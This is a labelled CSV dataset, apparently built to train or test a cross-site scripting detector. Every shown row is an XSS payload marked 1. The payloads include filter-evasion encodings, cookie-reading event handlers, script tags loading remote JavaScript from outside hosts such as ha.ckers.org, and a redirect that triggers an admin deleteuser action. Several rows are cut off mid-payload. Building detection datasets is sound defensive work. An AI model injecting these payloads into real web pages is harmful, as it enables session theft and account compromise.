input,label
<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>,1
<link rel=stylesheet href=data:,1
"<style>@import ""data:",1
"<a style=""pointer-events:none;position:absolute;""><a style=""position:absolute;"" onclick=""javascript:alert(1);"">XXX</a></a><a href=""javascript:javascript:alert(1)"">XXX</a>",1
<style>*[{}@import'%(css)s?]</style>X,1
"<div style=""font-family:'foo&#10;;color:red;';"">XXX",1
"<div style=""font-family:foo}color=red;"">XXX",1
<// style=x:expression\28javascript:alert(1)\29>,1
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>,1
<div style=content:url(%(svg)s)></div>,1
"<div style=""list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));"">X",1
"<div id=d><div style=""font-family:'sans\27\3B color\3Ared\3B'"">X</div></div> <script>with(document.getElementById(""d""))innerHTML=innerHTML</script>",1
"<div style=""background:url(/f#&#127;oo/;color:red/*/foo.jpg);"">X",1
"<div style=""font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);"">X",1
"<div id=""x"">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>",1
"<x style=""background:url('x&#1;;color:red;/*')"">XXX</x>",1
<script>({set/**/$($){_/**/setter=$,1
<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>,1
<script>Object.__noSuchMethod__ = Function,1
"<meta charset=""x-imap4-modified-utf7"">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi",1
"<meta charset=""x-imap4-modified-utf7"">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>",1
"<meta charset=""mac-farsi"">¼script¾javascript:alert(1)¼/script¾",1
X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >,1
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>,1
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>,1
<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>,1
1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>,1
"<a style=""behavior:url(#default#AnchorClick);"" folder=""javascript:javascript:alert(1)"">XXX</a>",1
"<x style=""behavior:url(%(sct)s)"">",1
"<xml id=""xss"" src=""%(htc)s""></xml> <label dataformatas=""html"" datasrc=""#xss"" datafld=""payload""></label>",1
"<event-source src=""%(event)s"" onload=""javascript:alert(1)"">",1
"<a href=""javascript:javascript:alert(1)""><event-source src=""data:application/x-dom-event-stream",1
"<div id=""x"">x</div> <xml:namespace prefix=""t""> <import namespace=""t"" implementation=""#default#time2""> <t:set attributeName=""innerHTML"" targetElement=""x"" to=""&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;"">",1
<script>%(payload)s</script>,1
<script src=%(jscript)s></script>,1
<script language='javascript' src='%(jscript)s'></script>,1
<script>javascript:alert(1)</script>,1
"<IMG SRC=""javascript:javascript:alert(1);"">",1
<IMG SRC=javascript:javascript:alert(1)>,1
<IMG SRC=`javascript:javascript:alert(1)`>,1
<SCRIPT SRC=%(jscript)s?<B>,1
"<FRAMESET><FRAME SRC=""javascript:javascript:alert(1);""></FRAMESET>",1
<BODY ONLOAD=javascript:alert(1)>,1
<BODY ONLOAD=javascript:javascript:alert(1)>,1
"<IMG SRC=""jav    ascript:javascript:alert(1);"">",1
<BODY onload!#$%%&()*~+-_.,1
"<SCRIPT/SRC=""%(jscript)s""></SCRIPT>",1
<<SCRIPT>%(payload)s//<</SCRIPT>,1
"<IMG SRC=""javascript:javascript:alert(1)""",1
<iframe src=%(scriptlet)s <,1
"<INPUT TYPE=""IMAGE"" SRC=""javascript:javascript:alert(1);"">",1
"<IMG DYNSRC=""javascript:javascript:alert(1)"">",1
"<IMG LOWSRC=""javascript:javascript:alert(1)"">",1
"<BGSOUND SRC=""javascript:javascript:alert(1);"">",1
"<BR SIZE=""&{javascript:alert(1)}"">",1
"<LAYER SRC=""%(scriptlet)s""></LAYER>",1
"<LINK REL=""stylesheet"" HREF=""javascript:javascript:alert(1);"">",1
<STYLE>@import'%(css)s';</STYLE>,1
"<META HTTP-EQUIV=""Link"" Content=""<%(css)s>; REL=stylesheet"">",1
"<XSS STYLE=""behavior: url(%(htc)s);"">",1
"<STYLE>li {list-style-image: url(""javascript:javascript:alert(1)"");}</STYLE><UL><LI>XSS",1
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:javascript:alert(1);"">",1
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:javascript:alert(1);"">",1
"<IFRAME SRC=""javascript:javascript:alert(1);""></IFRAME>",1
"<TABLE BACKGROUND=""javascript:javascript:alert(1)"">",1
"<TABLE><TD BACKGROUND=""javascript:javascript:alert(1)"">",1
"<DIV STYLE=""background-image: url(javascript:javascript:alert(1))"">",1
"<DIV STYLE=""width:expression(javascript:alert(1));"">",1
"<IMG STYLE=""xss:expr/*XSS*/ession(javascript:alert(1))"">",1
"<XSS STYLE=""xss:expression(javascript:alert(1))"">",1
"<STYLE TYPE=""text/javascript"">javascript:alert(1);</STYLE>",1
"<STYLE>.XSS{background-image:url(""javascript:javascript:alert(1)"");}</STYLE><A CLASS=XSS></A>",1
"<STYLE type=""text/css"">BODY{background:url(""javascript:javascript:alert(1)"")}</STYLE>",1
<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->,1
"<BASE HREF=""javascript:javascript:alert(1);//"">",1
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""%(scriptlet)s""></OBJECT>",1
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>,1
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;""></BODY></HTML>",1
"<SCRIPT SRC=""%(jpg)s""></SCRIPT>",1
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-",1
"<form id=""test"" /><button form=""test"" formaction=""javascript:javascript:alert(1)"">X",1
<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>,1
"<P STYLE=""behavior:url('#default#time2')"" end=""0"" onEnd=""javascript:alert(1)"">",1
<STYLE>@import'%(css)s';</STYLE>,1
<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>,1
"<meta charset= ""x-imap4-modified-utf7""&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>",1
<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>,1
<style onreadystatechange=javascript:javascript:alert(1);></style>,1
"<?xml version=""1.0""?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>",1
<embed code=%(scriptlet)s></embed>,1
<embed code=javascript:javascript:alert(1);></embed>,1
<embed src=%(jscript)s></embed>,1
<frameset onload=javascript:javascript:alert(1)></frameset>,1
<object onerror=javascript:javascript:alert(1)>,1
"<embed type=""image"" src=%(scriptlet)s></embed>",1
"<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]<![CDATA[cript:javascript:alert(1);"">]]</C><X></xml>",1
<IMG SRC=&{javascript:alert(1);};>,1
"<a href=""jav&#65ascript:javascript:alert(1)"">test1</a>",1
"<a href=""jav&#97ascript:javascript:alert(1)"">test1</a>",1
"<embed width=500 height=500 code=""data:text/html",1
"<iframe srcdoc=""&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>"">",1
"'';!--""<XSS>=&{()}",1
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,1
"<IMG SRC=""javascript:alert('XSS');"">",1
<IMG SRC=javascript:alert('XSS')>,1
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
"<IMG SRC=javascript:alert(""XSS"")>",1
"<IMG SRC=`javascript:alert(""RSnake says",1
"<a onmouseover=""alert(document.cookie)"">xxs link</a>",1
<a onmouseover=alert(document.cookie)>xxs link</a>,1
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",1
"<IMG SRC=# onmouseover=""alert('xxs')"">",1
"<IMG SRC= onmouseover=""alert('xxs')"">",1
"<IMG onmouseover=""alert('xxs')"">",1
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,1
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,1
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,1
"<IMG SRC=""jav	ascript:alert('XSS');"">",1
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",1
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",1
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",1
"perl -e 'print ""<IMG SRC=java\0script:alert(\""XSS\"")>"";' > out",1
"<IMG SRC="" &#14;  javascript:alert('XSS');"">",1
"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
<BODY onload!#$%&()*~+-_.,1
"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",1
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,1
<SCRIPT SRC=//ha.ckers.org/.j>,1
"<IMG SRC=""javascript:alert('XSS')""",1
<iframe src=http://ha.ckers.org/scriptlet.html <,1
"\"";alert('XSS');//",1
"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",1
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",1
"<BODY BACKGROUND=""javascript:alert('XSS')"">",1
"<IMG DYNSRC=""javascript:alert('XSS')"">",1
"<IMG LOWSRC=""javascript:alert('XSS')"">",1
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",1
"<IMG SRC='vbscript:msgbox(""XSS"")'>",1
"<IMG SRC=""livescript:[code]"">",1
<BODY ONLOAD=alert('XSS')>,1
"<BGSOUND SRC=""javascript:alert('XSS');"">",1
"<BR SIZE=""&{alert('XSS')}"">",1
"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",1
"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",1
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,1
"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">",1
"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",1
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",1
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",1
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",1
"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",1
"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",1
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",1
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",1
"<XSS STYLE=""xss:expression(alert('XSS'))"">",1
"<XSS STYLE=""behavior: url(xss.htc);"">",1
¼script¾alert(¢XSS¢)¼/script¾,1
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",1
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64",1
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",1
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",1
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",1
"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",1
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",1
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",1
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",1
"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",1
"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",1
"<DIV STYLE=""width: expression(alert('XSS'));"">",1
"<BASE HREF=""javascript:alert('XSS');//"">",1
" <OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",1
"<EMBED SRC=""data:image/svg+xml;base64",1
"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",1
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",1
"<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",1
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser,1
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",1
" <HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",1
"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<A HREF=""http://66.102.7.147/"">XSS</A>",1
"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"">XSS</A>",1
"<A HREF=""http://1113982867/"">XSS</A>",1
"<A HREF=""http://0x42.0x0000066.0x7.0x93/"">XSS</A>",1
"<A HREF=""http://0102.0146.0007.00000223/"">XSS</A>",1
"<A HREF=""htt	p://6	6.000146.0x7.147/"">XSS</A>",1
"<iframe %00 src=""&Tab;javascript:prompt(1)&Tab;""%00>",1
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>',1
"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",1
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera},1
<img/src=`%00` onerror=this.onerror=confirm(1) ,1
"<form><isindex formaction=""javascript&colon;confirm(1)""",1
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;,1
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>,1
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?,1
"<iframe/src=""data:text/html;&Tab;base64&Tab;",1
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/,1
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00,1
"<iframe/src=""data:text/html",1
"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",1
<svg><script xlink:href=data&colon;,1
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera},1
"<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">",1
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,1
"<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X",1
"</script><img/*%00/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/%00*/onerror='eval(src)'>",1
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,1
"<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(1)""&#11;&#10;&#09;;>",1
"<a href=""data:application/x-x509-user-cert;&NewLine;base64&NewLine;",1
http://www.google<script .com>alert(document.location)</script,1
"<a&#32;href&#61;&#91;&#00;&#93;""&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;"">XYZ</a",1
<img/src=@&#32;&#13; onerror = prompt('&#49;'),1
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;,1
<script ^__^>alert(String.fromCharCode(49))</script ^__^,1
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(,1
"&#00;</form><input type&#61;""date"" onfocus=""alert(1)"">",1
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>,1
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/,1
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>,1
"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",1
<script ~~~>alert(0%0)</script ~~~>,1
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>,1
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN,1
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1),1
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',1
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera},1
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^,1
"<div/style=""width:expression(confirm(1))"">X</div> {IE7}",1
<iframe/%00/ src=javaSCRIPT&colon;alert(1),1
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//,1
"/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>",1
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\,1
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>,1
"<a/href=""javascript:&#13; javascript:prompt(1)""><input type=""X"">",1
</plaintext\></|\><plaintext/onmouseover=prompt(1),1
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},1
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",1
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,1
"<iframe style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",1
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",1
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",1
"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",1
"<var onmouseover=""prompt(1)"">On Mouse Over</var>",1
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,1
"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",1
<%<!--'%><script>alert(1);</script -->,1
"<script src=""data:text/javascript",1
<iframe/src \/\/onload = prompt(1),1
<iframe/onreadystatechange=alert(1),1
<svg/onload=alert(1),1
<input value=<><iframe/src=javascript:confirm(1),1
"<input type=""text"" value=`` <div/onmouseover='alert(1)'>X</div>",1
http://www.<script>alert(1)</script .com,1
